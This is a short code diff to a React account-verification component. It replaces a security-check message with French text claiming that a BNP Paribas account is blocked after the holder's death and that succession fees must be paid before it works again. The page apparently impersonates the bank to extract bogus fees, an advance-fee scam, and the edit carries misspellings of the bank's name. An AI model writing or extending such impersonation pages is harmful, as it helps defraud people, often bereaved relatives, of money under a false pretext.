@@ -91,9 +91,10 @@ export default function CompteVerification() {
             Pourquoi mon compte est bloqué ?
           </p>
           <p className="text-amber-200/60 text-xs leading-relaxed">
-            Suite au traitement de votre virement, une vérification
-            automatique a été déclenchée par notre système de sécurité.
-            Cette procédure est standard et vise à protéger vos fonds.
+Chère client, nous vous informons que votre compte bancaire BNP paribas est actuellement bloqué suite au décès du titulaire. 
+Cette mesure est appliquée conformément à la réglementation en vigueur dans le cadre du traitement de la succession.
+ Vous devrez passer procédure de frais succession avant toute fonctionnalité des options sur votre compte BNP parisbas. 
+ Pour toute information complémentaire, veuillez contacter votre agence bancaire BNP parisbas .Nous vous remercions de votre compréhension et restons à votre disposition pour toute information complémentaire.
           </p>
         </div>
 
